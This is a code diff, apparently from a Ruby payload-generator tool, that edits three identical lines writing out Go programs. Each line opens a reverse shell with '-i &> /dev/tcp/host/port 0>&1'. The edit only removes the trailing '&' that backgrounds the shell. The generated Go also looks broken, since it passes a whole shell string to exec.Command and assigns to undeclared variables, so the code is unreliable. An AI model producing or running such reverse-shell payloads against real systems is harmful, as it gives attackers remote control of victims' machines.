@@ -66,7 +66,7 @@ if File.directory? file
                 f.puts "    \"os/exec\""
                 f.puts ")"
                 f.puts "func main() {"
-                f.puts "    out, err = exec.Command(\"#{shell} -i &> /dev/tcp/#{host}/#{port} 0>&1 &\").Output()"
+                f.puts "    out, err = exec.Command(\"#{shell} -i &> /dev/tcp/#{host}/#{port} 0>&1\").Output()"
                 f.puts "}"
             }
             puts "#{s}Saved to #{file}!"
@@ -83,7 +83,7 @@ if File.directory? file
                 f.puts "    \"os/exec\""
                 f.puts ")"
                 f.puts "func main() {"
-                f.puts "    out, err = exec.Command(\"#{shell} -i &> /dev/tcp/#{host}/#{port} 0>&1 &\").Output()"
+                f.puts "    out, err = exec.Command(\"#{shell} -i &> /dev/tcp/#{host}/#{port} 0>&1\").Output()"
                 f.puts "}"
             }
             puts "#{s}Saved to #{file}!"
@@ -112,7 +112,7 @@ else
                 f.puts "    \"os/exec\""
                 f.puts ")"
                 f.puts "func main() {"
-                f.puts "    out, err = exec.Command(\"#{shell} -i &> /dev/tcp/#{host}/#{port} 0>&1 &\").Output()"
+                f.puts "    out, err = exec.Command(\"#{shell} -i &> /dev/tcp/#{host}/#{port} 0>&1\").Output()"
                 f.puts "}"
             }
             puts "#{s}Saved to #{file}!"
